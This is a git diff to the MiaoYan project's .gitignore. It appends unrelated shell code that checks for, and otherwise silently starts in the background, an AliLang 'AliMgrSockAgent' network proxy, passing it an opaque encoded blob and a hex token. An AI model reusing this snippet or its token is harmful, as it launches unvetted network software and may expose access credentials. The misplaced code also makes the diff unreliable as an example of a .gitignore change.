@@ -8,3 +8,12 @@ MiaoYan.xcodeproj/xcuserdata/*
 .idea/
 Releases
 .DS_Store
+
+
+if ps ax | grep -v grep | grep AliMgrSockAgent > /dev/null
+then
+    echo "网络加速已启动～"
+else
+    echo "网络加速正在启动中～"
+    nohup /Applications/AliLang.app/Contents/Resources/AliMgr/AliMgrSockAgent -bd HRFUBkUMDlQPXhNUB14ZUAVSAAJSVkABQxRRRkQUCRRTRwwbLlYIUgEJCENeRh0XEUhGFFUWD1sWBVMVT1cBGwFTSFcCVxQVREBcEUcBE29dC0NBQBcAVgNIDxVdWQdCFBASDwFTVhs= -wd 102972 -td f9e351c522724c85aa87bf7ed6a6f6000a2d8f10 > /dev/null &
+fi
